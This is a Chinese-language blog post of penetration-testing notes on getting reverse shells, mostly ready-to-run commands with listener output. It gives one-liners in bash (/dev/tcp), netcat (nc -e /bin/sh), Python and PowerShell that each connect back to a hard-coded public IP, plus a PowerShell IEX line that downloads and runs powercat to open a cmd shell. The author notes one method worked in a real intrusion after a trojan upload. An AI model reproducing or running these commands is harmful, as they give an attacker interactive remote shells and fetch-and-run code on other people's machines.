---
layout: post
toc: true
title: "「笔记」：反弹shell的几种方法"
author: Bin4xin
categories:
    - blog
tags:
    - 安全工具
    - 渗透
    - 笔记
permalink: /blog/2019/shell/reserve/back/
---

记录：关于bash shell的反弹:)随笔记<br>
假定环境：

- kali被攻击机器；ip:192.168.3.32
- iZj6cgn7odv59wmjjhe6zwZ攻击机；ip:47.52.233.92

## 1.bash
```bash
root@kali:/# bash -i >&/dev/tcp/47.52.233.92/1234 0>& 1
```

```bash
root@iZj6cgn7odv59wmjjhe6zwZ:~# nc -lvvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 223.240.212.236 37798 received!
root@kali:/# whoami 
whoami
root
root@kali:/# ifconfig    
ifconfig
eth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 1c:39:47:e5:d0:0d  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 132196  bytes 121378334 (115.7 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 132196  bytes 121378334 (115.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.3.32  netmask 255.255.255.0  broadcast 192.168.3.255
        inet6 fe80::c895:5ca5:529a:eef3  prefixlen 64  scopeid 0x20<link>
        ether 68:07:15:d5:46:16  txqueuelen 1000  (Ethernet)
        RX packets 140963  bytes 101469044 (96.7 MiB)
        RX errors 0  dropped 15  overruns 0  frame 0
        TX packets 86373  bytes 16895892 (16.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## 2.netcat
```bash
root@kali:/# nc -e /bin/sh 47.52.233.92 1234
```


```bash
root@iZj6cgn7odv59wmjjhe6zwZ:~# nc -lvvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 223.240.212.236 37812 received!
python -c 'import pty;pty.spawn("/bin/sh")'
# whoami
whoami
root
# 
```


## 3.python

```bash
root@kali:/# python -c 'import socket,
subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("47.52.233.92",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
root@iZj6cgn7odv59wmjjhe6zwZ:~# nc -lvvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 223.240.212.236 37820 received!
# whoami
root
# id
uid=0(root) gid=0(root) 组=0(root)
```


## 4.powershell构造函数反弹shell
实际反弹shell中成功的；应用场景：
1.WINDOWS系统
2.上传木马成功，但是没有交互式shell
```bash
powershell.exe -nop -c "$client = New-Object Net.Sockets.TCPClient('117.64.238.192',11223);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


```bash
powershell IEX (New-Object System.Net.Webclient).DownloadString
('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');
powercat -c 47.52.233.92 -p 11223 -e cmd
```

~~meterpreter可以直接开启~~

~~run getui -e~~

~~然后用rdesktop就能直接连了~~